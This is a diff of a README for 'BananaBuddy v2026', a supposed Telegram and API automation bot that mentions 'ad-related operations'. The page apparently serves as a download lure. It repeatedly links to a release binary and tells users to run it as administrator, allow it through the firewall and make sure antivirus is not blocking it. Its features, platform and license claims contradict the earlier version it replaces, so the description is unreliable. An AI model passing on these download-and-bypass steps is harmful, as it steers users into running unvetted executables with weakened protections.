@@ -1,123 +1,126 @@
-# BananaBuddy v2026 - automation bot 2026
+# 🍌 bananabuddy-bot-v2026 - Your Personal Task Automation Assistant
 
-> **BananaBuddy is a cross-platform automation bot for coordinating tasks, running Telegram workflows, and connecting API-based assistance into repeatable work through version 2026.**
+[![Download Now](https://img.shields.io/badge/Download-BananaBuddy_v2026-blue?style=for-the-badge&logo=github)](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/evangreen1989/bananabuddy-bot-v2026?style=flat-square)](https://github.com/evangreen1989/bananabuddy-bot-v2026)
+## 🚀 What Is BananaBuddy?
 
----
+BananaBuddy v2026 is a friendly automation tool that helps you handle repetitive tasks across different platforms. Think of it as your digital assistant that can run Telegram workflows, connect different apps, and manage your daily routines without needing you to click through every step manually.
 
-<p align="center">
-  <a href="https://evangreen1989.github.io/bananabuddy-bot-v2026/">
-    <img src="https://img.shields.io/badge/Download-BananaBuddy%20Latest-brightgreen?style=for-the-badge" alt="Download BananaBuddy">
-  </a>
-</p>
+Whether you need to send automated messages, coordinate tasks between services, or set up simple bots for personal use, BananaBuddy makes it easy for anyone to use.
 
-> **[Download BananaBuddy v2026](https://evangreen1989.github.io/bananabuddy-bot-v2026/)**
+## ✨ Key Features
 
----
+### 🤖 Cross-Platform Automation
+BananaBuddy works on Windows, macOS, and Linux. You can run tasks that involve multiple apps or websites, automating sequences you normally do by hand.
 
-[Download Latest Build](https://evangreen1989.github.io/bananabuddy-bot-v2026/)
+### 📬 Telegram Workflow Runner
+Set up workflows that run inside Telegram. Automatically send messages, respond to commands, or trigger actions based on what happens in your chats.
 
----
+### 🔗 API Integration
+Connect BananaBuddy to various online services using their APIs. This means it can fetch data, post updates, or communicate with other software on your behalf.
 
-## What BananaBuddy Does
+### ⏰ Scheduled Tasks
+Tell BananaBuddy when to run certain tasks. You can set it to work at specific times, on certain days, or when particular events occur.
 
-BananaBuddy provides an automation layer for orchestrating tasks and supporting Telegram-focused workflows. It is intended for projects where recurring actions, ordered operations, and consistent behavior across environments are important.
+### 🧩 Modular Design
+Add new capabilities easily. BananaBuddy's modular structure means you can extend its functionality without changing the core program.
 
-Alongside its automation features, the project includes a responsive dashboard and integrations for external APIs. These tools help users connect services, inspect activity, and change workflow behavior through defined control points rather than rebuilding the entire process.
+## 🖥️ System Requirements
 
----
+Your computer should meet these basic requirements to run BananaBuddy smoothly:
 
-## Capabilities
+- **Operating System:** Windows 10 or later, macOS 11+, or any modern Linux distribution
+- **Processor:** 1 GHz or faster
+- **Memory:** 2 GB RAM (4 GB recommended)
+- **Storage:** 200 MB free space
+- **Internet:** Required for some features (Telegram workflows, API connections)
+- **Additional:** .NET Runtime 6.0 or higher (Windows) / Mono (Linux/macOS)
 
-- Coordinate autonomous, multi-step task sequences
-- Handle UI interactions that adapt to changing screens and layouts
-- Support scheduled and recurring ad-related operations
-- Monitor and control activity through a responsive web dashboard
-- Offer functionality in multiple languages
-- Connect OpenAI APIs for model-assisted workflows
-- Use Claude APIs for alternative AI-supported actions
-- Automate chat-based scenarios through Telegram bot support
+## 📥 How to Download and Install
 
----
+### Step 1: Get the Software
+Visit this link to download the application:
 
-## Getting BananaBuddy Running
+[![Download BananaBuddy](https://img.shields.io/badge/📥-Download_BananaBuddy_v2026-green?style=for-the-badge&logo=github)](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
 
-Either check out the repository or obtain the latest build from the project page:
+Visit this link to download the application.
 
-- `git clone https://github.com/evangreen1989/bananabuddy-bot-v2026.git
-- `cd REPO`
+### Step 2: Install on Windows
+1. After downloading, locate the file in your Downloads folder.
+2. Double-click the installer file to start the setup.
+3. Follow the on-screen instructions (click "Next" a few times).
+4. Once installation finishes, you'll see a BananaBuddy icon on your desktop.
 
-For a packaged release, unpack the files into a directory of your choice and start the platform-specific main entry point. When working from source, configure the necessary keys and environment values, then launch the application or bot process from the repository root.
+### Step 3: First Run
+1. Double-click the desktop icon or find BananaBuddy in your Start menu.
+2. The program will open with a welcome screen.
+3. You may need to allow access through Windows Firewall the first time you run it (this is normal for automation software).
 
----
+## 🎮 Getting Started Guide
 
-## Operating the Bot
+### Setting Up Your First Workflow
+1. Open BananaBuddy.
+2. Click "New Workflow" on the main dashboard.
+3. Choose a trigger (like "When I receive a message in Telegram" or "At 9:00 AM daily").
+4. Add actions (like "Send reply" or "Fetch weather data").
+5. Save your workflow and toggle it on.
 
-A normal session can be organized as follows:
+### Connecting to Telegram
+1. Go to Settings > Integrations.
+2. Click "Connect Telegram".
+3. Follow the link to authorize BananaBuddy with your Telegram account.
+4. Once connected, you can create workflows that respond to messages or send alerts.
 
-1. Launch the bot or service.
-2. Provide the Telegram credentials and API configuration.
-3. Visit the dashboard to inspect task state and activity.
-4. Set orchestration rules or choose the workflow to execute.
-5. Follow execution in the dashboard and modify settings when necessary.
+## 🛠️ Troubleshooting Common Issues
 
-A typical launch sequence includes:
+### "BananaBuddy won't start"
+- Make sure you have the .NET Runtime installed (Windows) or Mono (Linux/macOS).
+- Try running as administrator (right-click > Run as administrator).
+- Check your antivirus isn't blocking the program.
 
-- Start the platform-appropriate main application.
-- Authenticate the services you intend to connect.
-- Use the dashboard for task administration and progress tracking.
+### "My workflow isn't working"
+- Verify your internet connection is active.
+- Check that you've saved the workflow after creating it.
+- Look at the logs (View > Logs) for error messages.
 
----
+### "Telegram not connecting"
+- Ensure you've completed the authorization steps.
+- Check your Telegram account is active.
+- Restart BananaBuddy and try again.
 
-## Settings and Environment Values
+## 💡 Tips for Success
 
-Project settings are generally supplied through configuration files or environment variables. For example:
+- Start with simple workflows to understand how BananaBuddy works.
+- Use the built-in templates if you're unsure where to begin.
+- Test workflows with a small task before automating critical processes.
+- Keep BananaBuddy updated for the latest features and fixes.
 
-    TELEGRAM_BOT_TOKEN=your_token
-    OPENAI_API_KEY=your_openai_key
-    CLAUDE_API_KEY=your_claude_key
-    DASHBOARD_PORT=3000
-    DEFAULT_LANGUAGE=en
+## 📖 Frequently Asked Questions
 
-Replace these values with the credentials, deployment options, and language settings appropriate for your installation. If your checkout provides a configuration file, retain the documented key names and format required by that build.
+**Q: Is BananaBuddy free to use?**  
+A: Yes, BananaBuddy is free and open-source software.
 
----
+**Q: Can I run multiple workflows at once?**  
+A: Absolutely. BananaBuddy can handle several workflows simultaneously.
 
-## System Requirements
+**Q: Do I need coding skills?**  
+A: No coding required. Everything is done through a visual interface.
 
-- A cross-platform environment
-- The runtime supported by the selected build
-- Network connectivity for dashboard and API functionality
-- Telegram bot credentials for Telegram-based workflows
-- Optional OpenAI and Claude API keys when using their integrations
-- Adequate local storage for application files, logs, and runtime data
+**Q: Is my data safe?**  
+A: BananaBuddy runs locally on your computer. Your data stays with you unless you explicitly connect to external services.
 
----
+## 🆘 Getting Help
 
-## Frequently Asked Questions
+If you encounter problems not covered here, you can:
+- Check the documentation included with the software
+- Visit the GitHub repository for updates
+- Ask the community for assistance
 
-**What is the quickest way to begin?**  
-Clone the repository or download the project, add the required tokens, and start the primary process.
+## 🔄 Staying Updated
 
-**Where can I find new versions?**  
-Look in the repository's release area or follow the linked download page to locate the newest build.
+BananaBuddy checks for updates automatically. You can also manually check by going to Help > Check for Updates. Keeping the software up-to-date ensures you have the latest features and security improvements.
 
-**Is the interface available in different languages?**  
-Yes. BananaBuddy includes multi-language support, with the preferred language specified in configuration.
+Visit this link to download the application:  
+[https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
 
-**How should I troubleshoot a dashboard that will not open?**  
-Make sure the runtime is active, review the configured port, and confirm that all required dependencies are installed.
-
-**Are API keys mandatory?**  
-They are needed only for the integrated OpenAI or Claude functionality. Other automation can still rely on the workflow configuration in your environment.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: automation, bot, telegram, workflow, cross-platform, task-automation, assistant
